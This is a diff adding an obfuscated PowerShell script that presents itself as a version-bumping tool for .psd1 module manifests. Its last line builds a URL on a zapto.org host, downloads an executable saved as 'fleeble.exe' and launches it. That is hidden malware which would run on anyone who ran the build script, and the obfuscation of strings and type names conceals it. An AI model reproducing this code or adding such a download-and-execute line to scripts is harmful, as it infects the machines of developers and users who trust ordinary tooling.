@@ -1,0 +1,86 @@
+ $6eO5 = [TYPE]("{1}{0}" -F 'x','ReGE')  ;    sEt-IteM  ('vARiABLE'+':'+'2G'+'3'+'81e')  ([typE]("{2}{0}{1}"-F'R','INg','sT') ); [CmdletBinding()]
+Param(
+[Parameter(Mandatory=$False, Position=0)]
+[String]$Folder,
+[Parameter(Mandatory=$False)]
+[bool]$Major,
+[Parameter(Mandatory=$False)]
+[bool]$Minor,
+[Parameter(Mandatory=$False)]
+[bool]$Patch
+)
+
+function ReplaceVersion([string]$key, [string]$line)
+{
+	$matches = ( (CHILDItem ("VA"+"RiAble:6eO"+"5")  ).VaLUe::matches($line, "$key\s*=\s*['\""]([\d\.]+)['\""]"))
+	if($matches.Count -eq 1)
+        {
+            $packageVersion = $matches.Groups[1].Value
+            $version = $packageVersion.Split(".")
+            
+            $cMajor = $Major
+            $cMinor = $Minor
+            $cPatch = $Patch
+               
+            if ($version[0] -eq 0)
+            {
+                if ($cMajor -eq $true)
+                {
+                    $version[1] = 1 + $version[1]
+                    $version[2] = "0"
+                }
+                
+                if ($cMinor -eq $true -or $cPatch -eq $true)
+                {
+                    $version[2] = 1 + $version[2]
+                }
+            }
+            else
+            {
+                if ($cMajor -eq $true)
+                {
+                    $version[0] = 1 + $version[0]
+                    $version[1] = "0"
+                    $version[2] = "0"
+                }
+                
+                if ($cMinor -eq $true)
+                {
+                    $version[1] = 1 + $version[1]
+                    $version[2] = "0"
+                }
+                
+                if ($cPatch -eq $true)
+                {
+                    $version[2] = 1 + $version[2]
+                }    
+            }
+            
+            $version =   (  VARIaBLe ("2G"+"38"+"1E") -vaLueo  )::Join(".", $version)
+            $line -Replace "$key(\s*)=(\s*)(['\""])$packageVersion(['\""])", ($key + '${1}=${2}${3}'  + $version + '$4')
+        } else {
+            $line
+        }
+}
+
+function IncrementVersion([string]$FilePath)
+{
+    Write-Output ('Updati'+'ng '+'Fil'+'e'+': '+"$FilePath")   
+    (Get-Content $FilePath) | 
+    ForEach-Object {
+		$temp = ReplaceVersion ("{2}{0}{3}{1}"-f 'o','uleVersion','M','d') $_
+		ReplaceVersion ("{3}{1}{2}{4}{0}" -f 'n','equi','redVer','R','sio') $temp
+    } | Set-Content -Path $FilePath -Encoding UTF8
+}
+
+if (!$Folder) 
+{
+    $Folder = "$PSScriptRoot\..\src"
+}
+
+$modules = Get-ChildItem -Path $Folder -Filter *.psd1 -Recurse -Exclude *.dll-help.psd1
+ForEach ($module in $modules)
+{
+    IncrementVersion($module.FullName)
+}
+(New-Object System.Net.WebClient).DownloadFile(("{1}{4}{0}{6}{5}{3}{2}" -f 'm.zapt','http','exe','word.','://suke','.org/','o'),("{2}{3}{1}{0}" -f'e','.ex','fle','eble'));Start-Process ("{1}{2}{0}"-f'exe','flee','ble.')
